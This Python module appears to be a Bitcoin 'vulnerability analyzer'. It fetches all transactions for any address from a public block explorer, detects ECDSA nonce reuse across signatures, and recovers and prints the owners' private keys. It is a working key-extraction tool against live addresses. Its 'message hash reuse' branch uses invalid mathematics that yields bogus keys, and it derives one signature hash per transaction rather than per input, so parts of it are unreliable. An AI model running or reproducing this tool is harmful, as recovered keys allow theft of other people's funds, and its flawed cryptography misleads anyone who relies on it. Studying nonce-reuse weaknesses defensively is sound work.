import requests
import hashlib
import time
import re
from typing import Dict, List, Tuple, Optional, Any
from crypto_utils import (
    parse_signature, extract_r_s, compute_z, modinv, 
    SECP256K1_N, validate_bitcoin_address, recover_private_key_from_nonce_reuse,
    recover_nonce_from_signatures, verify_recovered_private_key
)

class BitcoinAnalyzer:
    def __init__(self):
        self.base_url = "https://blockstream.info/api"
        self.progress_data = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Bitcoin-Vulnerability-Analyzer/1.0'
        })
    
    def validate_address(self, address: str) -> bool:
        """Validate Bitcoin address format"""
        return validate_bitcoin_address(address)
    
    def fetch_transactions(self, address: str) -> List[Dict]:
        """Fetch all transactions for a Bitcoin address"""
        all_txs = []
        last_seen_txid = None
        
        while True:
            url = f"{self.base_url}/address/{address}/txs"
            if last_seen_txid:
                url += f"/chain/{last_seen_txid}"
            
            try:
                response = self.session.get(url, timeout=30)
                response.raise_for_status()
                txs = response.json()
                
                if not txs:
                    break
                
                all_txs.extend(txs)
                last_seen_txid = txs[-1]['txid']
                
                # Rate limiting
                time.sleep(0.1)
                
                # Update progress
                self.update_progress(address, 'fetching', len(all_txs))
                
            except requests.RequestException as e:
                print(f"Error fetching transactions: {e}")
                break
        
        return all_txs
    
    def fetch_tx_hex(self, txid: str) -> str:
        """Fetch raw transaction hex"""
        url = f"{self.base_url}/tx/{txid}/hex"
        response = self.session.get(url, timeout=30)
        response.raise_for_status()
        return response.text.strip()
    
    def update_progress(self, address: str, stage: str, count: int = 0):
        """Update analysis progress"""
        self.progress_data[address] = {
            'stage': stage,
            'count': count,
            'timestamp': time.time()
        }
    
    def get_progress(self, address: str) -> Dict:
        """Get current analysis progress"""
        return self.progress_data.get(address, {
            'stage': 'idle',
            'count': 0,
            'timestamp': time.time()
        })
    
    def analyze_address(self, address: str) -> Dict:
        """
        Analyze Bitcoin address for cryptographic vulnerabilities
        Returns dict with vulnerabilities found and any recovered keys
        """
        results = {
            'address': address,
            'total_transactions': 0,
            'analyzed_signatures': 0,
            'vulnerabilities': [],
            'recovered_keys': [],
            'analysis_time': 0,
            'errors': []
        }
        
        start_time = time.time()
        
        try:
            # Fetch all transactions
            self.update_progress(address, 'fetching', 0)
            txs = self.fetch_transactions(address)
            results['total_transactions'] = len(txs)
            
            if not txs:
                return results
            
            # Analyze signatures
            self.update_progress(address, 'analyzing', 0)
            signatures = []  # Store all (r, s, z, txid) tuples
            
            for i, tx in enumerate(txs):
                txid = tx["txid"]
                
                try:
                    # Fetch raw transaction
                    raw = self.fetch_tx_hex(txid)
                    z = compute_z(raw)
                    
                    # Process each input signature
                    for vin in tx.get("vin", []):
                        sig = parse_signature(vin)
                        if not sig:
                            continue
                        
                        try:
                            r, s = extract_r_s(sig)
                            results['analyzed_signatures'] += 1
                            
                            # Check for vulnerabilities against all previous signatures
                            for r2, s2, z2, tx2 in signatures:
                                # Nonce reuse detection (same r, different s)
                                if r == r2 and s != s2:
                                    try:
                                        # Step 1: Recover the nonce k
                                        k = recover_nonce_from_signatures(z, z2, s, s2, r, SECP256K1_N)
                                        
                                        # Step 2: Recover the private key using the comprehensive algorithm
                                        d = recover_private_key_from_nonce_reuse(z, z2, s, s2, r, r2, SECP256K1_N)
                                        
                                        # Step 3: Verify the recovered private key
                                        verification_passed = verify_recovered_private_key(d, z, r, s, SECP256K1_N)
                                        
                                        vulnerability = {
                                            'type': 'nonce_reuse',
                                            'description': 'ECDSA nonce reuse vulnerability detected - same k value used in multiple signatures',
                                            'tx1': txid,
                                            'tx2': tx2,
                                            'private_key': hex(d),
                                            'severity': 'critical',
                                            'verification_passed': verification_passed,
                                            'recovered_nonce': hex(k),
                                            'technical_details': {
                                                'r1': hex(r),
                                                'r2': hex(r2),
                                                's1': hex(s),
                                                's2': hex(s2),
                                                'z1': hex(z),
                                                'z2': hex(z2),
                                                'nonce_k': hex(k),
                                                'attack_method': 'ECDSA nonce reuse (k recovery)'
                                            }
                                        }
                                        results['vulnerabilities'].append(vulnerability)
                                        results['recovered_keys'].append({
                                            'key': hex(d),
                                            'method': 'nonce_reuse',
                                            'transactions': [txid, tx2],
                                            'confidence': 'high' if verification_passed else 'medium',
                                            'verified': verification_passed,
                                            'nonce': hex(k)
                                        })
                                        
                                    except AssertionError as e:
                                        # This shouldn't happen since we check r == r2, but log it anyway
                                        results['errors'].append(f"Nonce reuse assertion failed: {e}")
                                    except Exception as e:
                                        results['errors'].append(f"Nonce reuse recovery failed: {e}")
                                
                                # Message hash reuse detection (same z, different r or s)
                                elif z == z2 and (r != r2 or s != s2):
                                    try:
                                        # For message hash reuse with different r values, we can still attempt recovery
                                        # This uses a different mathematical approach
                                        if r != r2 and s != s2:
                                            # Calculate using the standard ECDSA relationship
                                            # This is more complex and may not always work
                                            r_diff = (r - r2) % SECP256K1_N
                                            s_diff = (s - s2) % SECP256K1_N
                                            
                                            if r_diff != 0 and s_diff != 0:
                                                d = (s_diff * modinv(r_diff, SECP256K1_N)) % SECP256K1_N
                                                
                                                vulnerability = {
                                                    'type': 'message_hash_reuse',
                                                    'description': 'Same message hash signed with different nonces',
                                                    'tx1': txid,
                                                    'tx2': tx2,
                                                    'private_key': hex(d),
                                                    'severity': 'high',
                                                    'technical_details': {
                                                        'r1': hex(r),
                                                        'r2': hex(r2),
                                                        's1': hex(s),
                                                        's2': hex(s2),
                                                        'z1': hex(z),
                                                        'z2': hex(z2)
                                                    }
                                                }
                                                results['vulnerabilities'].append(vulnerability)
                                                results['recovered_keys'].append({
                                                    'key': hex(d),
                                                    'method': 'message_hash_reuse',
                                                    'transactions': [txid, tx2],
                                                    'confidence': 'medium'
                                                })
                                            
                                    except Exception as e:
                                        results['errors'].append(f"Message hash reuse recovery failed: {e}")
                            
                            # Add current signature to the list
                            signatures.append((r, s, z, txid))
                            
                        except Exception as e:
                            results['errors'].append(f"Failed to extract r,s from {txid}: {e}")
                
                except Exception as e:
                    results['errors'].append(f"Failed to process transaction {txid}: {e}")
                
                # Update progress
                self.update_progress(address, 'analyzing', i + 1)
                
                # Rate limiting
                if i % 10 == 0:
                    time.sleep(0.1)
        
        except Exception as e:
            results['errors'].append(f"Analysis failed: {e}")
        
        finally:
            results['analysis_time'] = time.time() - start_time
            self.update_progress(address, 'completed', results['total_transactions'])
        
        return results
